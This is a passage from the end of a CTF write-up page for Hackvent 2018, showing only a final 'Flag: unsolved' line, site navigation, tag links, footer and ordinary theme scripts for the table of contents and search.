</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr></div><script> document.addEventListener("DOMContentLoaded", () => { console.log("Hello World!"); tocbot.init({ tocSelector: '#toc', contentSelector: '.post-content', ignoreSelector: '[data-toc-skip]', headingSelector: 'h1', orderedList: false, scrollSmooth: false, }); }); </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div class="panel-heading"> <a href="https://github.com/shiltemann/CTF-writeups-public/tree/main/website/writeups/Hackvent_2018/index.md"><i class="fab fa-github"></i> Edit on GitHub </a></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/CTF-writeups-public/tag/image/">image</a> <a class="post-tag" href="/CTF-writeups-public/tag/rsa/">RSA</a> <a class="post-tag" href="/CTF-writeups-public/tag/lsb/">LSB</a> <a class="post-tag" href="/CTF-writeups-public/tag/cipher/">cipher</a> <a class="post-tag" href="/CTF-writeups-public/tag/pcap/">pcap</a> <a class="post-tag" href="/CTF-writeups-public/tag/audio/">audio</a> <a class="post-tag" href="/CTF-writeups-public/tag/aws/">aws</a> <a class="post-tag" href="/CTF-writeups-public/tag/bash/">bash</a> <a class="post-tag" href="/CTF-writeups-public/tag/binwalk/">binwalk</a> <a class="post-tag" href="/CTF-writeups-public/tag/crib-dragging/">crib dragging</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/shiltemann">Team Galaxians</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false" ><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/CTF-writeups-public/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script defer src="/CTF-writeups-public/assets/js/dist/commons.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/CTF-writeups-public/app.js"></script>
